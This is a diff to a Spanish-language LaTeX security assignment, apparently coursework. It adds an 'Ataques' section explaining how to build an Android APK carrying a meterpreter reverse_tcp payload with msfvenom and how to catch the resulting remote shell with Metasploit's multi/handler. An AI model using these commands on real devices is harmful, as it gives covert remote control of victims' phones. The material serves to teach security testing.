@@ -19,7 +19,7 @@
 \tableofcontents
 \clearpage 
 
-\lstset{style=cstyle}
+\lstset{style=bashstyle}
 
 
 \section{Caso de estudio}
@@ -132,13 +132,37 @@ Principalmente el uso de contraseñas seguras (compuestas tanto por caracteres m
 
 Una acción de concientización interesante podría ser la demostración de qué tan fácil puede llegar a ser descubrir una contraseña habitual, mediante el uso de diccionarios y/o fuerza bruta.
 
+\section{Ataques}
 
+\emph{Explique el procedimiento para la ejecución del componente meterpreter en un dispositivo/computadora remoto/a a través de msfvenom} 
 
+Para poder ejecutar una aplicación con un \emph{shell reverso \footnote{Se establece una conexión entre dos computadoras, la que inicia la conexión dirige una terminal interactiva hacía el destino \autocite{ReverseShell}}} en un dispositivo Android, primero se debe crear un archivo \emph{.apk} (archivo instalable en un Android) que contenga el código necesario para establecer la conexión con otra computadora. Para ello se usa el programa \texttt{msfvenom} de la siguiente manera:
 
+\begin{lstlisting}
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PUERTO_DE_ESCUCHA> R> ~/app.apk
+\end{lstlisting}
 
+\begin{itemize}
+    \item \texttt{-p android/meterpreter/reverse\_tcp}: con este parámetro le indicamos a \texttt{msfvenom} que el \emph{payload} (código adicional) que queremos inyectar en la aplicación \emph{app.apk} realice una conexión TCP con la IP <IP> al puerto <PUERTO\_DE\_ESCUCHA>  
+    \item \texttt{LHOST}: dirección IP a la cual conectarse
+    \item \texttt{LPORT}: puerto al cual establecer la conexión 
+\end{itemize}
 
+Una vez instalada la aplicación en el dispositivo Android al cual se desea atacar, se debe ejecutar la consola de \emph{Metasploit} (con el comando \texttt{msfconsole}), e ingresar lo siguiente:
 
+\begin{itemize}
+    \item \texttt{use exploit/multi/handler} 
+    \item \texttt{set payload android/meterpreter/reverse\_tcp} 
+    \item \texttt{set LHOST <IP>} 
+    \item \texttt{set LPORT <PUERTO\_DE\_ESCUCHA>} 
+    \item \texttt{exploit} 
+\end{itemize}
 
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{meterpreter-android}
+    \caption{Conexión desde \texttt{msfconsole} a un dispositivo Android}
+\end{figure}
 
 
 
